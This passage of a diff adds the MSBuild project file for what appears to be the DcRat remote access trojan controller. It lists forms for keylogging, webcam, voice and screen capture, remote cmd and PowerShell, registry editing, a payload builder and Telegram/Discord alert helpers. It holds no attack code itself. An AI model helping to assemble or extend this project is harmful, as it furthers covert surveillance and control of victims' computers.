+    <EmbeddedResource Include="helpForms\helperFormDiscord.zh-CN.resx">
+      <DependentUpon>helperFormDiscord.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormMail.zh-CN.resx">
+      <DependentUpon>helperFormMail.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormMessage.resx">
+      <DependentUpon>helperFormMessage.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormCodeDom.resx">
+      <DependentUpon>helperFormCodeDom.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormRegValueEditBinary.zh-CN.resx">
+      <DependentUpon>helperFormRegValueEditBinary.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormRegValueEditMultiString.zh-CN.resx">
+      <DependentUpon>helperFormRegValueEditMultiString.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormRegValueEditString.zh-CN.resx">
+      <DependentUpon>helperFormRegValueEditString.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormRegValueEditWord.zh-CN.resx">
+      <DependentUpon>helperFormRegValueEditWord.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormTask.zh-CN.resx">
+      <DependentUpon>helperFormTask.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormTelegram.zh-CN.resx">
+      <DependentUpon>helperFormTelegram.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormCamera.zh-CN.resx">
+      <DependentUpon>singleFormCamera.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormCmd.zh-CN.resx">
+      <DependentUpon>singleFormCmd.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormCodeDom.resx">
+      <DependentUpon>singleFormCodeDom.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormDingTalk.resx">
+      <DependentUpon>helperFormDingTalk.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormDiscord.resx">
+      <DependentUpon>helperFormDiscord.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormMail.resx">
+      <DependentUpon>helperFormMail.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormRegValueEditBinary.resx">
+      <DependentUpon>helperFormRegValueEditBinary.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormRegValueEditMultiString.resx">
+      <DependentUpon>helperFormRegValueEditMultiString.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormRegValueEditString.resx">
+      <DependentUpon>helperFormRegValueEditString.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormRegValueEditWord.resx">
+      <DependentUpon>helperFormRegValueEditWord.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormTask.resx">
+      <DependentUpon>helperFormTask.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="helpForms\helperFormTelegram.resx">
+      <DependentUpon>helperFormTelegram.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormCodeDom.zh-CN.resx">
+      <DependentUpon>singleFormCodeDom.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormDevice.zh-CN.resx">
+      <DependentUpon>singleFormDevice.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormFile.zh-CN.resx">
+      <DependentUpon>singleFormFile.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormKeyLogger.zh-CN.resx">
+      <DependentUpon>singleFormKeyLogger.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormNetwork.zh-CN.resx">
+      <DependentUpon>singleFormNetwork.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormPowershell.zh-CN.resx">
+      <DependentUpon>singleFormPowershell.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormProcess.zh-CN.resx">
+      <DependentUpon>singleFormProcess.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormRegistry.zh-CN.resx">
+      <DependentUpon>singleFormRegistry.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormKeyLogger.resx">
+      <DependentUpon>singleFormKeyLogger.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormScreen.zh-CN.resx">
+      <DependentUpon>singleFormScreen.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormVoice.resx">
+      <DependentUpon>singleFormVoice.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormRegistry.resx">
+      <DependentUpon>singleFormRegistry.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormDevice.resx">
+      <DependentUpon>singleFormDevice.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormHome.resx">
+      <DependentUpon>childFormHome.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormSettings.resx">
+      <DependentUpon>childFormSettings.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ChildForms\childFormTasks.resx">
+      <DependentUpon>childFormTasks.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FormMain.resx">
+      <DependentUpon>FormMain.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <EmbeddedResource Include="singleForms\singleFormCamera.resx">
+      <DependentUpon>singleFormCamera.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormCmd.resx">
+      <DependentUpon>singleFormCmd.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormFile.resx">
+      <DependentUpon>singleFormFile.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormNetwork.resx">
+      <DependentUpon>singleFormNetwork.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormPowershell.resx">
+      <DependentUpon>singleFormPowershell.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormProcess.resx">
+      <DependentUpon>singleFormProcess.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormScreen.resx">
+      <DependentUpon>singleFormScreen.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="singleForms\singleFormVoice.zh-CN.resx">
+      <DependentUpon>singleFormVoice.cs</DependentUpon>
+    </EmbeddedResource>
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\GeoLite2-City.mmdb" />
+    <None Include="Resources\Toggle_Off.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Toggle_On.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\min.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\close.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\max.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\normal.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\min_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\max_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\normal_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\close_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\7za.exe" />
+    <None Include="Resources\USB.png" />
+    <None Include="Resources\HDD.png" />
+    <None Include="Resources\folder.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cmd.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cmd_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\detaillist.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\detaillist_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\device.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\device_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\file.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\file_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\iconlist.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\iconlist_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\info.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\info_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\keylogger.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\keylogger_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\network.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\network_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\powershell.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\powershell_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\process.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\process_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\registry.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\registry_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\screen.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\screen_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\voice.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\voice_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\webcam.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\webcam_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\about.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\about_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\builder.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\builder_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\home_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\setting.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\setting_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\task.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\task_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\home.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\side_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\side.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\capture_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\play.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\play_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\stop.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\stop_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\capture.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\back.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\back_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\copy.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\copy_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cut.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cut_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\delete.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\delete_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\download.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\download_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\file_zip.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\file_zip_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\goto.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\goto_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\jump.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\jump_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\newfolder.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\newfolder_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\open.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\open_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\paste.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\paste_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\refresh.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\refresh_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\rename_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\switch.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\switch_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\upload.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\upload_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\rename.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\save_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\save.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\search_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\search.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\dump.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\dump_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kill.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\kill_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\refreshprocess_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\refreshprocess.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\keyboard_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mouse.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mouse_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\keyboard.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\add.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\add_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\create_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\create.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\change.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\change_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\newfile.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\newfile_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\DcRat.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\DcRat_dark.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\DcRatIcon.ico" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <Import Project="..\packages\Fody.6.5.5\build\Fody.targets" Condition="Exists('..\packages\Fody.6.5.5\build\Fody.targets')" />
+  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+    <PropertyGroup>
+      <ErrorText>这台计算机上缺少此项目引用的 NuGet 程序包。使用“NuGet 程序包还原”可下载这些程序包。有关更多信息，请参见 http://go.microsoft.com/fwlink/?LinkID=322105。缺少的文件是 {0}。</ErrorText>
+    </PropertyGroup>
+    <Error Condition="!Exists('..\packages\Fody.6.5.5\build\Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Fody.6.5.5\build\Fody.targets'))" />
+    <Error Condition="!Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.7.0\build\Costura.Fody.props'))" />
+    <Error Condition="!Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.7.0\build\Costura.Fody.targets'))" />
+    <Error Condition="!Exists('..\packages\System.Text.Json.6.0.1\build\System.Text.Json.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\System.Text.Json.6.0.1\build\System.Text.Json.targets'))" />
+  </Target>
+  <Import Project="..\packages\Costura.Fody.5.7.0\build\Costura.Fody.targets" Condition="Exists('..\packages\Costura.Fody.5.7.0\build\Costura.Fody.targets')" />
+  <Import Project="..\packages\System.Text.Json.6.0.1\build\System.Text.Json.targets" Condition="Exists('..\packages\System.Text.Json.6.0.1\build\System.Text.Json.targets')" />
+  <PropertyGroup>
+    <PostBuildEvent>del *.xml</PostBuildEvent>
+  </PropertyGroup>
+</Project>
